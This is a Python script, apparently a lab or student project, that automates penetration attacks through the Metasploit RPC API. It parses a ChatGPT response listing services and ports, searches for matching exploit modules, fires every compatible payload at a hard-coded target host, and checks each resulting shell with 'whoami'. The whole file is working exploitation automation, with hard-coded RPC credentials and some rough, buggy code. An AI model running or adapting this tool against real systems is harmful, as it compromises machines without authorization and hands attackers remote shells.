import msgpack
import http.client
import time
import ipget
import ipaddress
#pip install getip
#load msgrpc ServerHost=10.0.3.15 ServerPort=55554 User=msf Pass=12345

def initialize(host,port,user,password):
    global uri,headers,client
    uri = '/api/'
    headers = {'Content-type' : 'binary/message-pack'}
    client = http.client.HTTPConnection(host, port)
    
    option = [user, password]
    option.insert(0, 'auth.login')
    #print(option)cd
    params = msgpack.packb(option)
    client.request('POST' , uri, params, headers)
    ret = client.getresponse()
    response = msgpack.unpackb(ret.read())
    #print(response)
    global token
    token = response.get(b'token')
    option=[token]
    option.insert(0,'console.create')
    #print(option)
    params = msgpack.packb(option)
    client.request('POST', uri, params, headers)
    ret = client.getresponse()
    response = msgpack.unpackb(ret.read())
    #print(response)
    global console_id
    console_id = response.get(b'id')


def msf_console_read():
    option = [token, console_id]
    option.insert(0, 'console.read')
    #print(option)
    params=msgpack.packb(option)
    client.request('POST', uri, params, headers)
    ret=client.getresponse()
    response=msgpack.unpackb(ret.read())
    
    data=response.get(b'data')
    #print("")
    #print(data)
    return data

def session_list():
    global SessionID
    option=["session.list", token]
    #print(option)
    print(" ")
    params=msgpack.packb(option)
    client.request('POST', uri, params, headers)
    ret=client.getresponse()
    response=msgpack.unpackb(ret.read(),strict_map_key=False)
    keys = list(response.keys())
    global SessionID
    SessionID = keys[0]
    print(SessionID)
    
#session_list()

#command="whoami\n"
def session_command(command):
    option=["session.shell_write", token, SessionID ,command ]
    #print(option)
    params=msgpack.packb(option)
    client.request('POST', uri, params, headers)
    ret=client.getresponse()
    response=msgpack.unpackb(ret.read())
#session_command(command)

#print(response.get(b'write_count'))
def session_console_read():
    option=["session.shell_read", token, SessionID, "ReadPointer" ]
    #print(option)
    params=msgpack.packb(option)
    client.request('POST', uri, params, headers)
    ret=client.getresponse()
    response=msgpack.unpackb(ret.read())
    print(response)
#session_console_read()

def get_ip():
    target_ip = ipget.ipget()
    ip_address = target_ip.ipaddr("eth1")
    ip = ipaddress.IPv4Interface(ip_address)
    ip_only = str(ip.ip)
    print(ip_only)
    return ip_only
    


def responce_gpt(GPT_resFile):
    with open(GPT_resFile,'r') as f:
        text=f.read()
        
        # 正規表現を使用して情報を抽出し、辞書に格納
        pattern = r'\?([^?]+)\? (\d+)'
        matches = re.findall(pattern, text)
        
        # 辞書に格納
        info_dict = {match[0].strip(): int(match[1]) for match in matches}
        service_list=list(info_dict.items())
        #print(service_list[0][0])
        return service_list
   
def pen(result_gpt):
    #gptからの応答の解析結果をリスト型で渡す,モジュールとペイロードごとのコマンドを作成
    for i in result_gpt:
        
        service_name=i[0] #モジュールがあるか検索するためのサービス名
        port_num=i[1] #port番号
        port_num=str(port_num)
        #サービス名からモジュールを検索、なければFalse、あれば、use exploit
        #print(service_name)
        module_name=search_module(service_name)
        
        #ここにモジュールがあったらコマンド作成のIFを入れたい
        if module_name == False:
            print('モジュールが見つかりせんでした')
        else:            
            #モジュールからコマンドを作成
            payload=search_paylaod(module_name)
            #paylaodごとにコマンドが作成される
            for pay in payload:
                print('ペイロード：'+pay)
                cmd=genarate_exploit_command(module_name,pay,rhost,port_num)
                command_exploit(cmd)
                print('time')
                option = [token, x]
                time.sleep(15)
                
                try:
                   session_list()
                   command1="whoami\n"
                   session_command(command1)
                   session_console_read()
                except:
                   print('sessionが確立されませんでした')
                   option = [ "console.destroy", token, x]
                   print(option)
                   params=msgpack.packb(option)
                   client.request('POST', uri, params, headers)
                   ret=client.getresponse()
                   response=msgpack.unpackb(ret.read())
                   print(response)
                   print(time)
                   
                   

def command_exploit(cmd):
    command=cmd
    option=[ "console.create", token]
    params = msgpack.packb(option)
    client.request('POST', uri, params, headers)
    ret = client.getresponse()
    response= msgpack.unpackb(ret.read())
    #print(response.get(b'id'))
    global x
    x=response.get(b'id')
    time.sleep(1)

    option=[token, x,command]
    option.insert(0,'console.write')
    #print(option)
    params = msgpack.packb(option)
    client.request('POST', uri, params, headers)
    ret = client.getresponse()
    response= msgpack.unpackb(ret.read())
    
    
  
   
    
        
def search_paylaod(module_name):
    option=[ "module.target_compatible_payloads",token, module_name,1 ]
    #print(option)
    params = msgpack.packb(option)
    client.request('POST', uri, params, headers)
    ret = client.getresponse()
    response= msgpack.unpackb(ret.read())
    response=response.get(b'payloads')
    #print(response)#List型で応答
    return response


# 検索対象の文字列  GPTからの結果を入力しモジュールを検索、あればReturn
#input_stringはChatGPTからの応答のテキストファイル
#サービス名から、モジュールを抜き出している
def search_module(service_name):

    command ='search '+service_name+ '\n'
    print('サービス名：'+service_name+'で検索中...')
    option=[token, console_id, command]
    option.insert(0,'console.write')
    params = msgpack.packb(option)
    client.request('POST', uri, params, headers)
    ret = client.getresponse()
    response= msgpack.unpackb(ret.read())
    #print('asaswas')
    time.sleep(5)
    #print(response.get(b'wrote'))
    global data
    data=msf_console_read()
    #print(data)
    #b7\'........のデータがdataに入る
    
    # 正規表現を使用して "use exploit" から次の改行文字までの文字列を抽出
    match = re.search(r'use (exploit/.*?)\n', data.decode('utf-8'))
    
    if match:
        extracted_text = match.group(1)
        print(extracted_text)
        return extracted_text #GPTからの応答から
    else:
        print("該当するmoduleが見つかりませんでした。")
        return False

def genarate_exploit_command(module_name,payload,rhost,rport):

        
    module='use '+module_name+'\n'
    #print('コマンド： \n'+module_name+payload+rhost+rport)
    paylaod='set PAYLOAD '+payload+'\n'
 
    rport='set RPORT '+rport+ '\n'
    rhost='set RHOST '+ rhost + '\n'
    
    cmd=module+paylaod+rhost+rport+'exploit'+' -J\n'
    
    return cmd
    
import re
global matches



def main():
    #host=input('HostIP : ')#host = '10.0.3.15'
    host=get_ip()
    #print(host)
    port="55554"
    #print(port)
    user="msf"
    #print(user)
    password="12345"
    print("HostIP: "+host+ " HostPort: "+port+ " Password: "+password)

    initialize(host,port,user,password)
    msf_console_read()
    GPT_resFile='./gptres.text'
    #module_name="exploit/unix/ftp/vsftpd_234_backdoor"
    
    global rhost
    rhost='10.0.0.5'
    result_gpt= responce_gpt(GPT_resFile)
    pen(result_gpt)
    
    time.sleep(15)
    session_list()
    command="whoami\n"
    session_command(command)
    session_console_read()
    
if __name__ =='__main__':
	main()
